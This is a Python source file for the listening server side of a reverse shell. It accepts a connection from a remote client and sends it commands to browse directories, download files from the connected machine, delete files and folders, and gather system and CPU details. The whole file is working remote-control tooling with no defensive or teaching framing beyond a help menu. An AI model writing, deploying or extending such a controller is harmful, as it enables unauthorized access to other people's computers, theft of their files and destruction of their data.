#! /usr/bin/env python

# Developer: Victor Pegoraro

#Call libs
import socket
import os

SERVER_HOST = "127.0.0.1"  #Set host ip
SERVER_PORT = 5003         #Set port

#Send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 1024

#Receive 4096 bytes each time
BUFFER_SIZE_FILE = 4096

#help
help = """

HELP:
command:     function:

dir          show all dirretorys and files
cd           go to directory
cd..         back directory
download     download file
delfile      delete file
delfolder    delete folder
sys          show system info
cpu          show cpu info
exit         close program

       """

#Download file from client
def download(filename):

    f_name =  filename
    f_type =  filename.split(".")[1]

    if f_type == "txt":
        txt = open(f_name, 'w')
        data  = client_socket.recv(BUFFER_SIZE).decode()
        txt.write(data)
        txt.close()
        print("[+] Download done...")

    else:
        binary = open(f_name, 'wb')
        data  = client_socket.recv(BUFFER_SIZE_FILE)
        binary.write(data)
        binary.close()
        print("[+] Download done...")


# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
print("[+] Start SERVER reverse shell")

s.listen(5)
print(f"[+] Listening as {SERVER_HOST}:{SERVER_PORT} ... \n")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"[+] {client_address[0]}:{client_address[1]} Connected! \n")

# print the current directory
results = client_socket.recv(BUFFER_SIZE).decode()
print("[+] The current directory: ", results)

while True:
    # get the command from prompt
    command = input("Shell>> ")
    cmd = command.split(" ")

    if command == "help":
        print(help)

    #Exit client function
    elif command.lower() == "exit":
        client_socket.send(command.encode())
        break

    #Go back directory
    elif cmd[0] == "cd..":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print("[+] The current directory: ", results)
 
    #Go directory
    elif cmd[0] == "cd":
        if len(cmd) < 2:
            print("[-] Folder not define")
            continue
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        if results == "find":
            results = client_socket.recv(BUFFER_SIZE).decode()
            print("[+] The current directory: ", results)
        else:
            print(results)

    #if none command
    elif command == "" :
        print("[-] Write a command")

    #list all directory content
    elif command.lower() == "dir" :
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    #Delete file
    elif cmd[0] == "delfile":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    #Delete folder
    elif cmd[0] == "delfolder":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)

    elif cmd[0] == "download":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        if results == "find":
            filename = cmd[1]
            download(filename)
        else:
            print(results)

    #System information
    elif command == "sys":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        sys = results.split(" ")
        print("="*40, "System Information", "="*40)
        print(f"System: {sys[0]}")
        print(f"Node Name: {sys[1]}")
        print(f"Release: {sys[2]}")
        print(f"Version: {sys[3]}")
        print(f"Machine: {sys[4]}")
        print(f"Processor: {sys[5]}")
        print("=" * 100 )

    #CPU information
    elif command == "cpu":
        client_socket.send(command.encode())
        results = client_socket.recv(BUFFER_SIZE).decode()
        cpu = results.split(" ")
        print(cpu)
        print("="*40, "CPU Info", "="*40)
        # number of cores
        print("Physical cores:", cpu[0])
        print("Total cores:", cpu[1])
        # CPU frequencies
        print(f"Max Frequency: {cpu[2]}Mhz")
        print(f"Min Frequency: {cpu[3]}Mhz")
        print(f"Current Frequency: {cpu[4]}Mhz")
        # CPU usage
        print("CPU Usage Per Core:")
        for i, percentage in enumerate(cpu[5]):
            print(f"Core {i}: {percentage}%")
        print(f"Total CPU Usage: {cpu[6]}%")
        print("=" * 100 )



    #ERROR
    else:
        print("[-] Command not exist")


# close connection to the client
client_socket.close()
# close server connection
s.close()
